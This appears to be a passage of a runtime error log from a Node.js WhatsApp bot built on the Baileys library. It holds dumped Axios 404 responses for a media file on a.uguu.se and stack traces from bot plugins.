      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 29390,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 2840827,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 29392,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Wed, 24 Jul 2024 01:55:27 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[24/07/24 13:00:03] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
      'User-Agent: axios/1.7.2\r\n' +
      'Accept-Encoding: gzip, compress, deflate, br\r\n' +
      'Host: a.uguu.se\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n',
    _keepAliveTimeout: 0,
    _onPendingData: [Function: nop],
    agent: Agent {
      _events: [Object: null prototype],
      _eventsCount: 2,
      _maxListeners: undefined,
      defaultPort: 443,
      protocol: 'https:',
      options: [Object: null prototype],
      requests: [Object: null prototype] {},
      sockets: [Object: null prototype],
      freeSockets: [Object: null prototype] {},
      keepAliveMsecs: 1000,
      keepAlive: true,
      maxSockets: Infinity,
      maxFreeSockets: 256,
      scheduling: 'lifo',
      maxTotalSockets: Infinity,
      totalSocketCount: 1,
      maxCachedSessions: 100,
      _sessionCache: [Object],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false
    },
    socketPath: undefined,
    method: 'GET',
    maxHeaderSize: undefined,
    insecureHTTPParser: undefined,
    joinDuplicateHeaders: undefined,
    path: '/cOHUppFf.mp3',
    _ended: false,
    res: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [Circular *1],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    },
    aborted: false,
    timeoutCb: [Function: emitRequestTimeout],
    upgradeOrConnect: false,
    parser: null,
    maxHeadersCount: null,
    reusedSocket: false,
    host: 'a.uguu.se',
    protocol: 'https:',
    _redirectable: Writable {
      _events: [Object],
      _writableState: [WritableState],
      _maxListeners: undefined,
      _options: [Object],
      _ended: true,
      _ending: true,
      _redirectCount: 0,
      _redirects: [],
      _requestBodyLength: 0,
      _requestBodyBuffers: [],
      _eventsCount: 3,
      _onNativeResponse: [Function (anonymous)],
      _currentRequest: [Circular *1],
      _currentUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false
    },
    [Symbol(shapeMode)]: false,
    [Symbol(kCapture)]: false,
    [Symbol(kBytesWritten)]: 0,
    [Symbol(kNeedDrain)]: false,
    [Symbol(corked)]: 0,
    [Symbol(kChunkedBuffer)]: [],
    [Symbol(kChunkedLength)]: 0,
    [Symbol(kSocket)]: TLSSocket {
      _tlsOptions: [Object],
      _secureEstablished: true,
      _securePending: false,
      _newSessionPending: false,
      _controlReleased: true,
      secureConnecting: false,
      _SNICallback: null,
      servername: 'a.uguu.se',
      alpnProtocol: false,
      authorized: true,
      authorizationError: null,
      encrypted: true,
      _events: [Object: null prototype],
      _eventsCount: 9,
      connecting: false,
      _hadError: false,
      _parent: null,
      _host: 'a.uguu.se',
      _closeAfterHandlingError: false,
      _readableState: [ReadableState],
      _writableState: [WritableState],
      allowHalfOpen: false,
      _maxListeners: undefined,
      _sockname: null,
      _pendingData: null,
      _pendingEncoding: '',
      server: undefined,
      _server: null,
      ssl: [TLSWrap],
      _requestCert: true,
      _rejectUnauthorized: false,
      timeout: 5000,
      parser: null,
      _httpMessage: [Circular *1],
      [Symbol(alpncallback)]: null,
      [Symbol(res)]: [TLSWrap],
      [Symbol(verified)]: true,
      [Symbol(pendingSession)]: null,
      [Symbol(async_id_symbol)]: 2567,
      [Symbol(kHandle)]: [TLSWrap],
      [Symbol(lastWriteQueueSize)]: 0,
      [Symbol(timeout)]: Timeout {
        _idleTimeout: 5000,
        _idlePrev: [TimersList],
        _idleNext: [Timeout],
        _idleStart: 74866,
        _onTimeout: [Function: bound ],
        _timerArgs: undefined,
        _repeat: null,
        _destroyed: false,
        [Symbol(refed)]: false,
        [Symbol(kHasPrimitive)]: false,
        [Symbol(asyncId)]: 2569,
        [Symbol(triggerId)]: 0
      },
      [Symbol(kBuffer)]: null,
      [Symbol(kBufferCb)]: null,
      [Symbol(kBufferGen)]: null,
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kSetNoDelay)]: false,
      [Symbol(kSetKeepAlive)]: true,
      [Symbol(kSetKeepAliveInitialDelay)]: 60,
      [Symbol(kBytesRead)]: 0,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(connect-options)]: [Object]
    },
    [Symbol(kOutHeaders)]: [Object: null prototype] {
      accept: [Array],
      'user-agent': [Array],
      'accept-encoding': [Array],
      host: [Array]
    },
    [Symbol(errored)]: null,
    [Symbol(kHighWaterMark)]: 65536,
    [Symbol(kRejectNonStandardBodyWrites)]: false,
    [Symbol(kUniqueHeaders)]: null
  },
  response: {
    status: 404,
    statusText: 'Not Found',
    headers: Object [AxiosHeaders] {
      server: 'nginx',
      date: 'Wed, 24 Jul 2024 06:02:39 GMT',
      'content-type': 'text/html',
      'content-length': '146',
      connection: 'keep-alive',
      'strict-transport-security': 'max-age=31536000; includeSubDomains'
    },
    config: {
      transitional: [Object],
      adapter: [Array],
      transformRequest: [Array],
      transformResponse: [Array],
      timeout: 0,
      xsrfCookieName: 'XSRF-TOKEN',
      xsrfHeaderName: 'X-XSRF-TOKEN',
      maxContentLength: -1,
      maxBodyLength: -1,
      env: [Object],
      validateStatus: [Function: validateStatus],
      headers: [Object [AxiosHeaders]],
      responseType: 'stream',
      method: 'get',
      url: 'https://a.uguu.se/cOHUppFf.mp3',
      data: undefined
    },
    request: <ref *1> ClientRequest {
      _events: [Object: null prototype],
      _eventsCount: 7,
      _maxListeners: undefined,
      outputData: [],
      outputSize: 0,
      writable: true,
      destroyed: false,
      _last: true,
      chunkedEncoding: false,
      shouldKeepAlive: true,
      maxRequestsOnConnectionReached: false,
      _defaultKeepAlive: true,
      useChunkedEncodingByDefault: false,
      sendDate: false,
      _removedConnection: false,
      _removedContLen: false,
      _removedTE: false,
      strictContentLength: false,
      _contentLength: 0,
      _hasBody: true,
      _trailer: '',
      finished: true,
      _headerSent: true,
      _closed: false,
      _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
        'Accept: application/json, text/plain, */*\r\n' +
        'User-Agent: axios/1.7.2\r\n' +
        'Accept-Encoding: gzip, compress, deflate, br\r\n' +
        'Host: a.uguu.se\r\n' +
        'Connection: keep-alive\r\n' +
        '\r\n',
      _keepAliveTimeout: 0,
      _onPendingData: [Function: nop],
      agent: [Agent],
      socketPath: undefined,
      method: 'GET',
      maxHeaderSize: undefined,
      insecureHTTPParser: undefined,
      joinDuplicateHeaders: undefined,
      path: '/cOHUppFf.mp3',
      _ended: false,
      res: [IncomingMessage],
      aborted: false,
      timeoutCb: [Function: emitRequestTimeout],
      upgradeOrConnect: false,
      parser: null,
      maxHeadersCount: null,
      reusedSocket: false,
      host: 'a.uguu.se',
      protocol: 'https:',
      _redirectable: [Writable],
      [Symbol(shapeMode)]: false,
      [Symbol(kCapture)]: false,
      [Symbol(kBytesWritten)]: 0,
      [Symbol(kNeedDrain)]: false,
      [Symbol(corked)]: 0,
      [Symbol(kChunkedBuffer)]: [],
      [Symbol(kChunkedLength)]: 0,
      [Symbol(kSocket)]: [TLSSocket],
      [Symbol(kOutHeaders)]: [Object: null prototype],
      [Symbol(errored)]: null,
      [Symbol(kHighWaterMark)]: 65536,
      [Symbol(kRejectNonStandardBodyWrites)]: false,
      [Symbol(kUniqueHeaders)]: null
    },
    data: IncomingMessage {
      _events: [Object],
      _readableState: [ReadableState],
      _maxListeners: undefined,
      socket: [TLSSocket],
      httpVersionMajor: 1,
      httpVersionMinor: 1,
      httpVersion: '1.1',
      complete: true,
      rawHeaders: [Array],
      rawTrailers: [],
      joinDuplicateHeaders: undefined,
      aborted: false,
      upgrade: false,
      url: '',
      method: null,
      statusCode: 404,
      statusMessage: 'Not Found',
      client: [TLSSocket],
      _consuming: false,
      _dumped: false,
      req: [ClientRequest],
      _eventsCount: 4,
      responseUrl: 'https://a.uguu.se/cOHUppFf.mp3',
      redirects: [],
      [Symbol(shapeMode)]: true,
      [Symbol(kCapture)]: false,
      [Symbol(kHeaders)]: [Object],
      [Symbol(kHeadersCount)]: 12,
      [Symbol(kTrailers)]: null,
      [Symbol(kTrailersCount)]: 0
    }
  }
}
[24/07/24 15:53:22] - TypeError: Cannot read properties of undefined (reading 'length')
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/owner/listblock.js:5:15)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
[25/07/24 02:03:04] - TypeError: Cannot read properties of undefined (reading 'toString')
    at getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:276:18)
    at encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:58)
    at prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:152)
    at generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:53)
    at generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:102)
    at Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:69)
    at Socket._0x5c2108.<computed> [as sendSticker] (/data/data/com.termux/files/home/.BOTTT/system/extra.js:2:169986)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/convert/stickerwm.js:29:8)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382)
[25/07/24 07:48:49] - Error: error:1C800064:Provider routines::bad decrypt
    at Decipheriv.final (node:internal/crypto/cipher:184:29)
    at Transform.final [as _final] (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:498:31)
    at prefinish (node:internal/streams/writable:914:14)
    at finishMaybe (node:internal/streams/writable:928:5)
    at Writable.end (node:internal/streams/writable:843:5)
    at IncomingMessage.onend (node:internal/streams/readable:946:10)
    at Object.onceWrapper (node:events:634:28)
    at IncomingMessage.emit (node:events:532:35)
    at endReadableNT (node:internal/streams/readable:1696:12)
    at process.processTicksAndRejections (node:internal/process/task_queues:82:21) {
  library: 'Provider routines',
  reason: 'bad decrypt',
  code: 'ERR_OSSL_BAD_DECRYPT'
}
[25/07/24 07:49:16] - TypeError: func.uploadImage is not a function
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/convert/tourl.js:21:12)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382)
[25/07/24 07:49:46] - TypeError: func.uploadImage is not a function
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/convert/tourl.js:21:12)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100382)
[27/07/24 11:26:27] - ReferenceError: isRegistered is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/tools/sendtext.js:11:5)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at EventEmitter.emit (node:events:532:35)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:40:16)
    at EventEmitter.emit (node:events:520:28)
    at Object.flush (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:73:16)
    at processNodeWithBuffer (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-recv.js:700:12)
[27/07/24 11:27:26] - ReferenceError: reply is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/tools/sendtext.js:11:5)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at EventEmitter.emit (node:events:532:35)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:40:16)
    at EventEmitter.emit (node:events:520:28)
    at Object.flush (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:73:16)
    at processNodeWithBuffer (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-recv.js:700:12)
[27/07/24 11:29:32] - ReferenceError: reply is not defined
    at Object.async (/data/data/com.termux/files/home/.BOTTT/plugins/tools/sendtext.js:17:9)
    at module.<computed> (/data/data/com.termux/files/home/.BOTTT/handler.js:2:100406)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/main.js:2:76716)
    at EventEmitter.emit (node:events:532:35)
    at EventEmitter.<anonymous> (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:40:16)
    at EventEmitter.emit (node:events:520:28)
    at Object.flush (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/event-buffer.js:73:16)
    at processNodeWithBuffer (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-recv.js:700:12)
[27/07/24 14:15:09] - AxiosError: Request failed with status code 404
    at settle (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/settle.js:19:12)
    at RedirectableRequest.handleResponse (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/adapters/http.js:537:9)
    at RedirectableRequest.emit (node:events:520:28)
    at RedirectableRequest._processResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:398:10)
    at RedirectableRequest._onNativeResponse (/data/data/com.termux/files/home/.BOTTT/node_modules/follow-redirects/index.js:91:12)
    at Object.onceWrapper (node:events:635:26)
    at ClientRequest.emit (node:events:520:28)
    at HTTPParser.parserOnIncomingClient (node:_http_client:700:27)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17)
    at TLSSocket.socketOnData (node:_http_client:542:22)
    at Axios.request (file:///data/data/com.termux/files/home/.BOTTT/node_modules/axios/lib/core/Axios.js:45:41)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async getHttpStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:317:21)
    at async getStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:277:26)
    at async encryptedStream (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages-media.js:322:30)
    at async prepareWAMessageMedia (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:114:109)
    at async generateWAMessageContent (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:374:13)
    at async generateWAMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Utils/messages.js:521:59)
    at async Object.sendMessage (/data/data/com.termux/files/home/.BOTTT/node_modules/@whiskeysockets/baileys/lib/Socket/messages-send.js:618:33) {
  code: 'ERR_BAD_REQUEST',
  config: {
    transitional: {
      silentJSONParsing: true,
      forcedJSONParsing: true,
      clarifyTimeoutError: false
    },
    adapter: [ 'xhr', 'http', 'fetch' ],
    transformRequest: [ [Function: transformRequest] ],
    transformResponse: [ [Function: transformResponse] ],
    timeout: 0,
    xsrfCookieName: 'XSRF-TOKEN',
    xsrfHeaderName: 'X-XSRF-TOKEN',
    maxContentLength: -1,
    maxBodyLength: -1,
    env: { FormData: [Function], Blob: [class Blob] },
    validateStatus: [Function: validateStatus],
    headers: Object [AxiosHeaders] {
      Accept: 'application/json, text/plain, */*',
      'Content-Type': undefined,
      'User-Agent': 'axios/1.7.2',
      'Accept-Encoding': 'gzip, compress, deflate, br'
    },
    responseType: 'stream',
    method: 'get',
    url: 'https://a.uguu.se/cOHUppFf.mp3',
    data: undefined
  },
  request: <ref *1> ClientRequest {
    _events: [Object: null prototype] {
      abort: [Function (anonymous)],
      aborted: [Function (anonymous)],
      connect: [Function (anonymous)],
      error: [Function (anonymous)],
      socket: [Function (anonymous)],
      timeout: [Function (anonymous)],
      finish: [Function: requestOnFinish]
    },
    _eventsCount: 7,
    _maxListeners: undefined,
    outputData: [],
    outputSize: 0,
    writable: true,
    destroyed: false,
    _last: true,
    chunkedEncoding: false,
    shouldKeepAlive: true,
    maxRequestsOnConnectionReached: false,
    _defaultKeepAlive: true,
    useChunkedEncodingByDefault: false,
    sendDate: false,
    _removedConnection: false,
    _removedContLen: false,
    _removedTE: false,
    strictContentLength: false,
    _contentLength: 0,
    _hasBody: true,
    _trailer: '',
    finished: true,
    _headerSent: true,
    _closed: false,
    _header: 'GET /cOHUppFf.mp3 HTTP/1.1\r\n' +
      'Accept: application/json, text/plain, */*\r\n' +
